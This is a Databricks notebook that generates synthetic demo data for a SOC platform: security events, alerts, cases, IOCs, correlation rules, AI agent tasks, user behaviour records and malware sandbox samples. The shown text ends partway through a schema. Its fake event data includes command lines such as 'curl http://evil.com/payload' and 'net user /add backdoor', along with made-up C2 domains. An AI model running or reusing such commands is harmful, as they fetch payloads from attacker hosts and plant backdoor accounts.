# Databricks Notebook: Populate SOC Intelligence Platform Data

> Copy each cell into a Databricks notebook. Each `---` separator marks a new cell.

## Cell 1 - Setup & Configuration

```python
# Databricks notebook source
# MAGIC %md
# MAGIC # SOC Intelligence Platform - Data Population
# MAGIC Populates all Delta Lake tables with realistic security operations data for demo purposes.

# COMMAND ----------

import uuid
import random
import json
from datetime import datetime, timedelta
from pyspark.sql import SparkSession
from pyspark.sql.types import *
from pyspark.sql.functions import *

spark = SparkSession.builder.getOrCreate()

CATALOG = "soc_platform"
SCHEMA = "security"

def use_schema():
    spark.sql(f"USE CATALOG {CATALOG}")
    spark.sql(f"USE SCHEMA {SCHEMA}")

try:
    use_schema()
    print(f"Using {CATALOG}.{SCHEMA}")
except:
    spark.sql(f"CREATE CATALOG IF NOT EXISTS {CATALOG}")
    spark.sql(f"CREATE SCHEMA IF NOT EXISTS {CATALOG}.{SCHEMA}")
    use_schema()
    print(f"Created and using {CATALOG}.{SCHEMA}")

NOW = datetime.utcnow()
def rand_ts(hours_back=720):
    return NOW - timedelta(hours=random.randint(1, hours_back), minutes=random.randint(0,59), seconds=random.randint(0,59))

def uid():
    return str(uuid.uuid4())
```

---

## Cell 2 - Security Events

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Security Events - Core SIEM Data

# COMMAND ----------

MITRE_TACTICS = ["Initial Access","Execution","Persistence","Privilege Escalation","Defense Evasion","Credential Access","Discovery","Lateral Movement","Collection","Exfiltration","Command and Control","Impact"]
MITRE_TECHNIQUES = ["T1566.001","T1059.001","T1053.005","T1548.002","T1070.004","T1003.001","T1082","T1021.001","T1560.001","T1048.003","T1071.001","T1486"]
EVENT_TYPES = ["authentication","firewall","dns_query","process_creation","file_modification","network_connection","registry_change","service_install","scheduled_task","powershell_execution","lateral_movement","data_exfiltration"]
SEVERITIES = ["low","medium","high","critical"]
SOURCES = ["CrowdStrike Falcon","Palo Alto NGFW","Windows Defender","Suricata IDS","Zeek NSM","Sysmon","Azure Sentinel","Carbon Black","SentinelOne","Cisco Umbrella"]
HOSTNAMES = [f"WS-{dept}-{i:03d}" for dept in ["ENG","FIN","HR","EXEC","IT","SEC"] for i in range(1,6)]
USERS = [f"{fn}.{ln}" for fn,ln in [("john","smith"),("sarah","chen"),("mike","johnson"),("emma","wilson"),("alex","kumar"),("lisa","rodriguez"),("david","kim"),("rachel","taylor"),("james","brown"),("maria","garcia"),("tom","anderson"),("priya","patel"),("chris","lee"),("nina","martinez"),("sam","williams")]]

events_data = []
for _ in range(5000):
    ts = rand_ts(168)
    sev = random.choices(SEVERITIES, weights=[40,30,20,10])[0]
    etype = random.choice(EVENT_TYPES)
    tactic_idx = random.randint(0, len(MITRE_TACTICS)-1)
    src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    dst_ip = random.choice([f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}", f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"])
    events_data.append((
        uid(), etype, sev, random.choice(SOURCES), src_ip, dst_ip,
        random.randint(1024,65535), random.choice([22,53,80,443,445,3389,8080,8443]),
        random.choice(["TCP","UDP","ICMP"]), random.choice(USERS), random.choice(USERS),
        random.choice(HOSTNAMES), random.choice(["svchost.exe","powershell.exe","cmd.exe","explorer.exe","chrome.exe","python.exe","notepad.exe",""]),
        random.choice(["","powershell -enc base64...","net user /add backdoor","whoami /all","reg query HKLM\\SOFTWARE","curl http://evil.com/payload"]),
        f"{etype} detected from {src_ip}",
        json.dumps({"raw": f"<14>1 {ts.isoformat()} {random.choice(HOSTNAMES)} {etype} - - {sev} event detected"}),
        MITRE_TACTICS[tactic_idx], MITRE_TECHNIQUES[tactic_idx],
        ts.isoformat(), NOW.isoformat()
    ))

events_schema = StructType([
    StructField("id", StringType()), StructField("event_type", StringType()), StructField("severity", StringType()),
    StructField("source", StringType()), StructField("source_ip", StringType()), StructField("dest_ip", StringType()),
    StructField("source_port", IntegerType()), StructField("dest_port", IntegerType()), StructField("protocol", StringType()),
    StructField("user_id", StringType()), StructField("username", StringType()), StructField("hostname", StringType()),
    StructField("process_name", StringType()), StructField("command_line", StringType()), StructField("description", StringType()),
    StructField("raw_log", StringType()), StructField("mitre_tactic", StringType()), StructField("mitre_technique", StringType()),
    StructField("event_timestamp", StringType()), StructField("created_at", StringType())
])

df_events = spark.createDataFrame(events_data, events_schema)
df_events.write.format("delta").mode("overwrite").saveAsTable("events")
print(f"Created {df_events.count()} security events")
```

---

## Cell 3 - Alerts

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Alerts

# COMMAND ----------

ALERT_TITLES = [
    "Brute Force Authentication Detected","Suspicious PowerShell Execution","Lateral Movement via SMB","DNS Tunneling Detected",
    "Malware C2 Beacon Activity","Data Exfiltration Attempt","Privilege Escalation via Token Manipulation","Ransomware File Encryption Pattern",
    "Credential Dumping via LSASS","Supply Chain Attack Indicator","Kerberoasting Activity","Pass-the-Hash Detected",
    "Unauthorized Cloud API Access","Phishing Email with Malicious Attachment","Zero-Day Exploit Attempt","SQL Injection on Web Application",
    "Rogue DHCP Server Detected","ARP Spoofing Attack","Suspicious Scheduled Task Creation","Cobalt Strike Beacon Detected",
    "DLL Sideloading Attempt","NTLM Relay Attack","Golden Ticket Forged","BloodHound Enumeration Detected",
    "Mimikatz Usage Detected","WMI Remote Execution","PsExec Lateral Movement","Encrypted Channel to Known C2",
    "Abnormal Data Transfer Volume","Insider Threat - Mass File Download"
]

ALERT_TYPES = ["intrusion","malware","exfiltration","lateral_movement","privilege_escalation","reconnaissance","credential_access","persistence"]
STATUSES = ["open","acknowledged","investigating","resolved","closed","false_positive"]

alerts_data = []
for i in range(500):
    ts = rand_ts(168)
    sev = random.choices(SEVERITIES, weights=[20,30,30,20])[0]
    title = random.choice(ALERT_TITLES)
    tactic_idx = random.randint(0, len(MITRE_TACTICS)-1)
    alerts_data.append((
        uid(), f"ALT-{2024_000+i:07d}", title,
        f"Automated detection: {title.lower()} originating from internal network segment.",
        sev, random.choices(STATUSES, weights=[30,15,20,15,10,10])[0],
        random.choice(ALERT_TYPES), random.choice(SOURCES),
        f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        random.choice(USERS), random.choice(HOSTNAMES),
        f"RULE-{random.randint(1000,9999)}", f"Detection Rule - {title.split()[0]}",
        MITRE_TACTICS[tactic_idx], MITRE_TECHNIQUES[tactic_idx],
        random.randint(40,99), random.choice([True, False, False, False]),
        random.choice(USERS + [""]), json.dumps(["apt","lateral","exfil","malware","insider"][:random.randint(1,3)]),
        ts.isoformat(), NOW.isoformat()
    ))

alerts_schema = StructType([
    StructField("id", StringType()), StructField("alert_id", StringType()), StructField("title", StringType()),
    StructField("description", StringType()), StructField("severity", StringType()), StructField("status", StringType()),
    StructField("alert_type", StringType()), StructField("source", StringType()),
    StructField("source_ip", StringType()), StructField("dest_ip", StringType()),
    StructField("user_id", StringType()), StructField("hostname", StringType()),
    StructField("rule_id", StringType()), StructField("rule_name", StringType()),
    StructField("mitre_tactic", StringType()), StructField("mitre_technique", StringType()),
    StructField("confidence_score", IntegerType()), StructField("false_positive", BooleanType()),
    StructField("assigned_to", StringType()), StructField("tags", StringType()),
    StructField("created_at", StringType()), StructField("updated_at", StringType())
])

df_alerts = spark.createDataFrame(alerts_data, alerts_schema)
df_alerts.write.format("delta").mode("overwrite").saveAsTable("alerts")
print(f"Created {df_alerts.count()} alerts")
```

---

## Cell 4 - Cases

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Cases & Incident Management

# COMMAND ----------

CASE_TITLES = [
    "APT41 Campaign - Financial Sector Targeting","Ransomware Incident - Engineering Dept","Insider Threat Investigation - Data Exfiltration",
    "Supply Chain Compromise via NPM Package","Credential Stuffing Attack on SSO","Nation-State Espionage - Executive Targeting",
    "Cryptojacking on Cloud Infrastructure","Business Email Compromise - CFO Impersonation","Watering Hole Attack on Partner Portal",
    "Zero-Day Exploitation of VPN Gateway","DDoS Attack on Customer Portal","SolarWinds-style Backdoor Discovery",
    "Lateral Movement from Compromised IoT Device","Phishing Campaign Targeting HR Department","Cloud Storage Misconfiguration Exposure",
    "Malicious Browser Extension Distribution","Third-Party API Key Compromise","DNS Hijacking of Corporate Domains",
    "Physical Security Breach Correlation","Advanced Persistent Threat - Healthcare Data"
]

CASE_CATEGORIES = ["malware","apt","insider_threat","ransomware","phishing","supply_chain","cloud_security","data_breach","credential_compromise","zero_day"]

cases_data = []
comments_data = []
timeline_data = []

for i in range(50):
    case_id = uid()
    ts = rand_ts(720)
    sev = random.choices(SEVERITIES, weights=[10,25,35,30])[0]
    status = random.choices(["new","investigating","contained","resolved","closed"], weights=[15,30,20,20,15])[0]
    title = random.choice(CASE_TITLES)

    cases_data.append((
        case_id, f"CASE-{2024_000+i:05d}", title,
        f"Investigation into {title.lower()}. Multiple indicators of compromise detected across network segments.",
        status, random.choice(["low","medium","high","critical"]), sev,
        random.choice(CASE_CATEGORIES), random.choice(USERS), random.choice(USERS),
        "Contained and remediated." if status in ["resolved","closed"] else "",
        json.dumps(["apt","nation_state","financial"][:random.randint(1,3)]),
        ts.isoformat(), NOW.isoformat(),
        (ts + timedelta(hours=random.randint(24,168))).isoformat() if status in ["resolved","closed"] else ""
    ))

    for j in range(random.randint(2,8)):
        comments_data.append((
            uid(), case_id, random.choice(USERS),
            random.choice([
                "Initial triage complete. Escalating to Tier 2.",
                "IOCs extracted and cross-referenced with threat intel feeds.",
                "Containment actions initiated. Affected hosts isolated.",
                "Forensic imaging of affected systems in progress.",
                "MITRE ATT&CK mapping completed. Multiple tactics identified.",
                "Coordinating with legal team for disclosure requirements.",
                "Network traffic analysis reveals C2 communication pattern.",
                "Malware sample submitted to sandbox for detonation analysis.",
                "User interviews scheduled to determine initial access vector.",
                "Remediation plan approved by CISO. Executing phase 1.",
            ]),
            random.choice([True, False]),
            (ts + timedelta(hours=j*4)).isoformat()
        ))

    for j, event in enumerate(["Case Created","Initial Triage","IOC Extraction","Containment Initiated","Forensic Analysis","Escalation","Remediation","Closure"]):
        if j <= random.randint(3,7):
            timeline_data.append((
                uid(), case_id, event, f"{event} - {random.choice(USERS)} performed action",
                random.choice(USERS), json.dumps({"step": j+1}),
                (ts + timedelta(hours=j*6)).isoformat()
            ))

cases_schema = StructType([
    StructField("id", StringType()), StructField("case_number", StringType()), StructField("title", StringType()),
    StructField("description", StringType()), StructField("status", StringType()), StructField("priority", StringType()),
    StructField("severity", StringType()), StructField("category", StringType()),
    StructField("assigned_to", StringType()), StructField("created_by", StringType()),
    StructField("resolution", StringType()), StructField("tags", StringType()),
    StructField("created_at", StringType()), StructField("updated_at", StringType()), StructField("resolved_at", StringType())
])

spark.createDataFrame(cases_data, cases_schema).write.format("delta").mode("overwrite").saveAsTable("cases")
spark.createDataFrame(comments_data, StructType([
    StructField("id",StringType()),StructField("case_id",StringType()),StructField("author",StringType()),
    StructField("comment",StringType()),StructField("is_internal",BooleanType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("case_comments")
spark.createDataFrame(timeline_data, StructType([
    StructField("id",StringType()),StructField("case_id",StringType()),StructField("event_type",StringType()),
    StructField("description",StringType()),StructField("actor",StringType()),StructField("metadata",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("case_timeline")

print(f"Created 50 cases, {len(comments_data)} comments, {len(timeline_data)} timeline entries")
```

---

## Cell 5 - Threat Intelligence (IOCs & Feeds)

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Threat Intelligence - Feeds & IOCs

# COMMAND ----------

FEED_SOURCES = [
    ("abuse.ch URLhaus","abuse_ch_urlhaus","https://urlhaus-api.abuse.ch/v1/","url","Malicious URL tracking from abuse.ch"),
    ("abuse.ch MalwareBazaar","abuse_ch_malwarebazaar","https://bazaar.abuse.ch/export/","hash","Malware sample hash repository"),
    ("abuse.ch ThreatFox","abuse_ch_threatfox","https://threatfox-api.abuse.ch/api/v1/","mixed","IOC sharing platform for malware C2"),
    ("AlienVault OTX","alienvault_otx","https://otx.alienvault.com/api/v1/","mixed","Open Threat Exchange community intelligence"),
    ("CIRCL MISP","circl","https://www.circl.lu/doc/misp/","mixed","Luxembourg CERT MISP threat sharing"),
    ("OpenPhish","openphish","https://openphish.com/feed.txt","url","Phishing URL feed"),
    ("US-CERT","uscert","https://www.cisa.gov/sites/default/files/feeds/","mixed","US-CERT cyber threat indicators"),
    ("Shadowserver","shadowserver","https://www.shadowserver.org/what-we-do/","ip","Shadowserver Foundation scan data"),
    ("Feodo Tracker","abuse_ch_sslblacklist","https://feodotracker.abuse.ch/downloads/","ip","Botnet C2 tracking"),
    ("MISP OSINT","misp_osint","https://www.misp-project.org/feeds/","mixed","Community MISP OSINT feeds"),
    ("VirusTotal","custom","https://www.virustotal.com/api/v3/","hash","VirusTotal threat intelligence API"),
    ("Recorded Future","custom","https://api.recordedfuture.com/v2/","mixed","Recorded Future threat intelligence"),
]

feeds_data = []
for fname, fsrc, furl, ftype, fdesc in FEED_SOURCES:
    feeds_data.append((
        uid(), fname, fsrc, furl, ftype, True, True,
        random.randint(1,24), rand_ts(48).isoformat(),
        random.choice(["success","success","success","failed"]),
        random.randint(500, 50000), fdesc, NOW.isoformat()
    ))

spark.createDataFrame(feeds_data, StructType([
    StructField("id",StringType()),StructField("feed_name",StringType()),StructField("feed_source",StringType()),
    StructField("feed_url",StringType()),StructField("feed_type",StringType()),
    StructField("enabled",BooleanType()),StructField("auto_sync",BooleanType()),
    StructField("sync_interval_hours",IntegerType()),StructField("last_sync_at",StringType()),
    StructField("last_sync_status",StringType()),StructField("total_indicators",IntegerType()),
    StructField("description",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("threat_feeds")

THREAT_TYPES = ["malware","phishing","c2","ransomware","botnet","exploit","scanner","bruteforce"]
INDICATOR_TYPES = ["ip","domain","url","hash_sha256","hash_md5","email","cve"]
C2_DOMAINS = ["evil-update.com","dl-service-cdn.net","api-sync-check.org","telemetry-data.io","cdn-resource-lb.com","update-service.xyz","cloud-metrics-api.net","analytics-tracking.io"]
MALWARE_HASHES = [f"{''.join(random.choices('0123456789abcdef', k=64))}" for _ in range(100)]
C2_IPS = [f"{random.choice([185,193,194,198,203,212])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(100)]

iocs_data = []
feed_ids = [f[0] for f in feeds_data]
for _ in range(2000):
    itype = random.choice(INDICATOR_TYPES)
    if itype == "ip":
        indicator = random.choice(C2_IPS)
    elif itype == "domain":
        indicator = random.choice(C2_DOMAINS)
    elif itype == "url":
        indicator = f"https://{random.choice(C2_DOMAINS)}/{random.choice(['payload','download','update','api','callback'])}/{uid()[:8]}"
    elif itype in ("hash_sha256","hash_md5"):
        indicator = random.choice(MALWARE_HASHES)
    elif itype == "email":
        indicator = f"{random.choice(['admin','support','billing','security'])}@{random.choice(C2_DOMAINS)}"
    else:
        indicator = f"CVE-{random.randint(2020,2024)}-{random.randint(1000,50000)}"

    sev = random.choices(SEVERITIES, weights=[20,30,30,20])[0]
    first = rand_ts(2160)
    iocs_data.append((
        uid(), random.choice(feed_ids), indicator, itype,
        random.choice(THREAT_TYPES), sev,
        round(random.uniform(0.4, 0.99), 2),
        json.dumps(random.sample(["apt","c2","exfil","persistence","ransomware","phishing","botnet","scanner"], random.randint(1,3))),
        f"Threat indicator: {indicator} associated with {random.choice(['APT41','Lazarus Group','FIN7','Sandworm','APT29','Fancy Bear','Wizard Spider','Evil Corp'])}",
        first.isoformat(), rand_ts(48).isoformat(), True,
        random.randint(0, 250), random.randint(0, 5), NOW.isoformat()
    ))

spark.createDataFrame(iocs_data, StructType([
    StructField("id",StringType()),StructField("feed_id",StringType()),StructField("indicator",StringType()),
    StructField("indicator_type",StringType()),StructField("threat_type",StringType()),StructField("severity",StringType()),
    StructField("confidence_score",FloatType()),StructField("tags",StringType()),StructField("description",StringType()),
    StructField("first_seen",StringType()),StructField("last_seen",StringType()),StructField("is_active",BooleanType()),
    StructField("match_count",IntegerType()),StructField("false_positive_count",IntegerType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("iocs")

print(f"Created {len(feeds_data)} threat feeds, {len(iocs_data)} IOCs")
```

---

## Cell 6 - Correlation Rules

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Correlation Rules Engine

# COMMAND ----------

RULE_TEMPLATES = [
    ("Brute Force Detection","Detects >10 failed logins from same source in 5 minutes","high",{"event_type":"authentication","result":"failure","count_threshold":10,"time_window":"5m","group_by":"source_ip"}),
    ("Lateral Movement Chain","Detects sequential access across 3+ hosts within 1 hour","critical",{"event_type":"network_connection","unique_targets":3,"time_window":"1h","same_user":True}),
    ("Data Exfiltration Volume","Alerts when >500MB transferred to external IP in 30 minutes","critical",{"direction":"outbound","bytes_threshold":524288000,"time_window":"30m","exclude_cdn":True}),
    ("Credential Dumping Sequence","Detects LSASS access followed by network authentication","high",{"sequence":["lsass_access","remote_auth"],"time_window":"15m","same_host":True}),
    ("DNS Tunneling Pattern","High-entropy DNS queries to single domain exceeding threshold","high",{"event_type":"dns_query","entropy_threshold":4.5,"query_count":100,"time_window":"10m"}),
    ("Ransomware File Pattern","Mass file rename/encryption across multiple directories","critical",{"event_type":"file_modification","unique_extensions":5,"file_count":50,"time_window":"5m"}),
    ("C2 Beacon Interval","Regular network connections at fixed intervals to rare domain","high",{"event_type":"network_connection","interval_variance":"<5%","min_connections":10,"time_window":"1h"}),
    ("Privilege Escalation Chain","User gains elevated privileges after suspicious activity","critical",{"sequence":["suspicious_process","privilege_change"],"time_window":"30m"}),
    ("Insider Data Staging","Large file copies to removable media or cloud storage","high",{"event_type":"file_operation","destination":"removable|cloud","size_threshold":104857600,"time_window":"1h"}),
    ("Supply Chain IOC Match","Network connection to known supply chain compromise indicators","critical",{"event_type":"network_connection","ioc_match":True,"ioc_category":"supply_chain"}),
    ("Kerberoasting Activity","Multiple TGS requests for service accounts in short period","high",{"event_type":"kerberos","request_type":"TGS","service_accounts":3,"time_window":"10m"}),
    ("Living Off the Land","Multiple LOLBIN executions from same host","medium",{"processes":["certutil","mshta","regsvr32","rundll32","wmic"],"unique_count":3,"time_window":"1h"}),
    ("Cloud IAM Abuse","Unusual IAM role assumption or policy modification","high",{"event_type":"cloud_iam","actions":["AssumeRole","PutRolePolicy","CreateUser"],"time_window":"30m"}),
    ("Phishing Chain Detection","Email open followed by download and process execution","high",{"sequence":["email_link_click","file_download","process_create"],"time_window":"15m"}),
    ("Zero Trust Violation","Access from non-compliant device to sensitive resource","medium",{"device_compliance":False,"resource_sensitivity":"high","action":"allow"}),
]

rules_data = []
matches_data = []

for name, desc, sev, logic in RULE_TEMPLATES:
    rule_id = uid()
    status = random.choices(["active","active","active","testing","inactive"], weights=[50,20,10,15,5])[0]
    rules_data.append((
        rule_id, name, desc, json.dumps(logic), sev, status,
        round(random.uniform(70, 98), 2), round(random.uniform(75, 99), 2), round(random.uniform(0.5, 8), 2),
        random.choice(["manual","ai_agent"]),
        random.choice([
            "Rule generated based on MITRE ATT&CK technique analysis.",
            "AI agent detected recurring pattern across 30-day window.",
            "Analyst-created rule based on threat intelligence brief.",
            "Auto-generated from incident post-mortem findings.",
        ]),
        json.dumps(["detection","mitre","production"][:random.randint(1,3)]),
        NOW.isoformat(), rand_ts(48).isoformat() if random.random() > 0.3 else "",
        random.randint(0, 500)
    ))

    for _ in range(random.randint(5, 30)):
        matches_data.append((
            uid(), rule_id,
            json.dumps([uid() for _ in range(random.randint(2,5))]),
            rand_ts(168).isoformat(), sev,
            json.dumps({"matched_conditions": random.randint(2,5), "score": round(random.uniform(60,99),1)}),
            random.choice([True, True, True, False, None]),
            random.choice(["Confirmed true positive.","Needs further investigation.","","Correlated with ongoing campaign."])
        ))

spark.createDataFrame(rules_data, StructType([
    StructField("id",StringType()),StructField("rule_name",StringType()),StructField("rule_description",StringType()),
    StructField("rule_logic",StringType()),StructField("severity",StringType()),StructField("status",StringType()),
    StructField("confidence_score",FloatType()),StructField("true_positive_rate",FloatType()),StructField("false_positive_rate",FloatType()),
    StructField("generated_by",StringType()),StructField("agent_reasoning",StringType()),StructField("tags",StringType()),
    StructField("created_at",StringType()),StructField("last_triggered_at",StringType()),StructField("trigger_count",IntegerType())
])).write.format("delta").mode("overwrite").saveAsTable("correlation_rules")

spark.createDataFrame(matches_data, StructType([
    StructField("id",StringType()),StructField("rule_id",StringType()),StructField("matched_events",StringType()),
    StructField("match_timestamp",StringType()),StructField("severity",StringType()),StructField("details",StringType()),
    StructField("is_true_positive",BooleanType()),StructField("analyst_notes",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("correlation_rule_matches")

print(f"Created {len(rules_data)} correlation rules, {len(matches_data)} matches")
```

---

## Cell 7 - AI Agents & Tasks

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## AI SOC Agents

# COMMAND ----------

AGENTS = [
    ("Atlas","triage","Triage Agent","Reviews incoming alerts, classifies severity, filters false positives using ML","TAO",96.2,12847,98.1,45),
    ("Sage","enrichment","Enrichment Agent","Cross-references IOCs with threat intel feeds, WHOIS, passive DNS","ALHF",94.8,8932,97.3,120),
    ("Commander","orchestrator","Orchestrator Agent","Coordinates multi-agent workflows, manages investigation pipelines","hybrid",91.5,5621,95.7,250),
    ("Nova","investigation","Investigation Agent","Deep-dive analysis of incidents, reconstructs attack chains using graph analysis","TAO",93.7,4215,96.8,180),
    ("Vanguard","response","Response Agent","Executes containment and remediation actions, integrates with SOAR platforms","ALHF",97.1,3987,99.2,35),
]

agents_data = []
tasks_data = []

for name, atype, role, desc, opt_method, perf, completed, accuracy, avg_rt in AGENTS:
    agent_id = uid()
    agents_data.append((
        agent_id, name, atype, desc,
        random.choice(["active","active","active","paused"]),
        role, opt_method, perf, completed, accuracy, avg_rt,
        json.dumps({"model": "databricks-dbrx-instruct", "temperature": 0.1, "max_tokens": 4096}),
        NOW.isoformat()
    ))

    TASK_TYPES = {"triage":["alert_triage"],"enrichment":["threat_enrichment"],"orchestrator":["alert_triage","threat_enrichment","log_analysis"],"investigation":["log_analysis"],"response":["incident_response"]}
    for _ in range(random.randint(20, 80)):
        ts = rand_ts(168)
        task_status = random.choices(["completed","completed","completed","processing","queued","escalated","failed"], weights=[50,15,10,10,5,7,3])[0]
        tasks_data.append((
            uid(), agent_id, random.choice(TASK_TYPES.get(atype, ["alert_triage"])),
            random.choice(SEVERITIES),
            task_status,
            json.dumps({"alert_id": uid(), "source": random.choice(SOURCES)}),
            json.dumps({"classification": random.choice(["true_positive","false_positive","needs_investigation"]), "confidence": round(random.uniform(0.6,0.99),2)}) if task_status == "completed" else "{}",
            round(random.uniform(0.5, 0.99), 2),
            task_status == "escalated",
            "Low confidence score requires human review" if task_status == "escalated" else "",
            random.randint(100, 5000),
            ts.isoformat(),
            (ts + timedelta(seconds=random.randint(1,300))).isoformat() if task_status == "completed" else ""
        ))

spark.createDataFrame(agents_data, StructType([
    StructField("id",StringType()),StructField("name",StringType()),StructField("type",StringType()),
    StructField("description",StringType()),StructField("status",StringType()),StructField("task_description",StringType()),
    StructField("optimization_method",StringType()),StructField("performance_score",FloatType()),
    StructField("tasks_completed",IntegerType()),StructField("accuracy_rate",FloatType()),
    StructField("avg_response_time",IntegerType()),StructField("config",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("ai_agents")

spark.createDataFrame(tasks_data, StructType([
    StructField("id",StringType()),StructField("agent_id",StringType()),StructField("task_type",StringType()),
    StructField("priority",StringType()),StructField("status",StringType()),StructField("input_data",StringType()),
    StructField("output_data",StringType()),StructField("confidence_score",FloatType()),
    StructField("escalated",BooleanType()),StructField("escalation_reason",StringType()),
    StructField("processing_time_ms",IntegerType()),StructField("created_at",StringType()),StructField("completed_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("agent_tasks")

print(f"Created {len(agents_data)} AI agents, {len(tasks_data)} tasks")
```

---

## Cell 8 - User Behavior Analytics

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## User Behavior Analytics (UEBA)

# COMMAND ----------

DEPARTMENTS = ["Engineering","Finance","Human Resources","Executive","IT","Security","Legal","Marketing","Sales","Operations"]
RISK_LEVELS = ["low","medium","high","critical"]

profiles_data = []
behavior_events_data = []

for user in USERS:
    profile_id = uid()
    dept = random.choice(DEPARTMENTS)
    risk = random.choices(RISK_LEVELS, weights=[50,30,15,5])[0]
    risk_score = {"low": random.randint(0,25), "medium": random.randint(26,55), "high": random.randint(56,80), "critical": random.randint(81,100)}[risk]

    profiles_data.append((
        profile_id, user, f"{user.replace('.',' ').title()}",
        f"{user}@company.com", dept, random.choice(["Analyst","Engineer","Manager","Director","VP","C-Suite"]),
        risk_score, risk,
        random.choice(["decreasing","stable","increasing","rapidly_increasing"]),
        random.randint(100, 5000), random.randint(0, 50), random.randint(0, 10),
        json.dumps({"login_hours": [9,10,11,14,15,16], "avg_session_min": random.randint(30,480)}),
        random.choice([True, False, False, False]),
        NOW.isoformat()
    ))

    BEH_TYPES = ["login","logout","file_access","privilege_use","vpn_connect","cloud_access","email_send","usb_mount","large_download","after_hours_access"]
    for _ in range(random.randint(50, 200)):
        ts = rand_ts(168)
        btype = random.choice(BEH_TYPES)
        behavior_events_data.append((
            uid(), profile_id, user, btype,
            random.choice(SEVERITIES),
            f"{user} performed {btype} from {random.choice(HOSTNAMES)}",
            f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            random.choice(HOSTNAMES),
            random.randint(0, 100),
            random.choice([True, False, False, False, False]),
            json.dumps({"geo": random.choice(["US","US","US","UK","DE","CN","RU","BR"]), "device": random.choice(["corporate_laptop","personal_device","vpn"])}),
            ts.isoformat()
        ))

spark.createDataFrame(profiles_data, StructType([
    StructField("id",StringType()),StructField("user_id",StringType()),StructField("user_name",StringType()),
    StructField("email",StringType()),StructField("department",StringType()),StructField("role_title",StringType()),
    StructField("risk_score",IntegerType()),StructField("risk_level",StringType()),
    StructField("risk_trend",StringType()),StructField("total_events",IntegerType()),
    StructField("high_risk_events",IntegerType()),StructField("flagged_events",IntegerType()),
    StructField("baseline_behavior",StringType()),StructField("has_anomalous_behavior",BooleanType()),
    StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("user_profiles")

spark.createDataFrame(behavior_events_data, StructType([
    StructField("id",StringType()),StructField("profile_id",StringType()),StructField("user_id",StringType()),
    StructField("event_type",StringType()),StructField("severity",StringType()),StructField("description",StringType()),
    StructField("source_ip",StringType()),StructField("hostname",StringType()),
    StructField("anomaly_score",IntegerType()),StructField("is_anomalous",BooleanType()),
    StructField("metadata",StringType()),StructField("event_timestamp",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("user_behavior_events")

print(f"Created {len(profiles_data)} user profiles, {len(behavior_events_data)} behavior events")
```

---

## Cell 9 - Malware Sandbox Results

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Malware Sandbox Analysis

# COMMAND ----------

MALWARE_FAMILIES = ["Emotet","TrickBot","QakBot","Cobalt Strike","Conti","REvil","BlackCat","LockBit","Agent Tesla","Remcos RAT","AsyncRAT","IcedID"]
THREAT_CATEGORIES = ["ransomware","trojan","rootkit","apt","worm","rat"]
FILE_TYPES = ["PE32 executable","PE64 executable","Microsoft Office Document","PDF Document","JavaScript","PowerShell Script","Python Script","ELF executable"]

samples_data = []
sessions_data = []

for i in range(100):
    sample_id = uid()
    sha256 = ''.join(random.choices('0123456789abcdef', k=64))
    md5 = ''.join(random.choices('0123456789abcdef', k=32))
    family = random.choice(MALWARE_FAMILIES)
    ts = rand_ts(720)

    samples_data.append((
        sample_id, md5, sha256, f"{family.lower()}_{random.randint(1000,9999)}.{'exe' if random.random()>0.3 else random.choice(['dll','doc','pdf','js','ps1'])}",
        random.choice(FILE_TYPES), random.randint(1024, 52428800),
        random.choice(["dpi_capture","upload","threat_feed","honeypot"]),
        ts.isoformat(), f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        family, random.choice(THREAT_CATEGORIES),
        random.choices(SEVERITIES, weights=[5,15,40,40])[0],
        random.choice([True,False]), random.choice(["UPX","VMProtect","Themida",""]),
        random.choice([True,False,False]),
        json.dumps(["YARA_"+family.upper(), "YARA_PACKED", "YARA_SHELLCODE"][:random.randint(1,3)]),
        True, random.choice(["completed","completed","completed","analyzing","failed"]),
        NOW.isoformat()
    ))

    for j in range(random.randint(1, 3)):
        sess_id = uid()
        env = random.choice(["windows_10","windows_11","linux_ubuntu"])
        duration = random.randint(30, 600)
        sessions_data.append((
            sess_id, sample_id, f"Session-{i}-{j}",
            env, f"VM-{random.randint(100,999)}",
            ts.isoformat(), (ts + timedelta(seconds=duration)).isoformat(), duration,
            random.choice(["completed","completed","completed","crashed"]),
            random.choice(["auto_execute","user_interaction"]),
            True, True,
            random.randint(10, 200), random.randint(0, 30), random.randint(0, 5), random.randint(0, 10485760),
            True, round(random.uniform(40, 99), 2), round(random.uniform(70, 99), 2),
            NOW.isoformat()
        ))

spark.createDataFrame(samples_data, StructType([
    StructField("id",StringType()),StructField("sample_hash_md5",StringType()),StructField("sample_hash_sha256",StringType()),
    StructField("sample_name",StringType()),StructField("file_type",StringType()),StructField("file_size",IntegerType()),
    StructField("source_type",StringType()),StructField("capture_timestamp",StringType()),
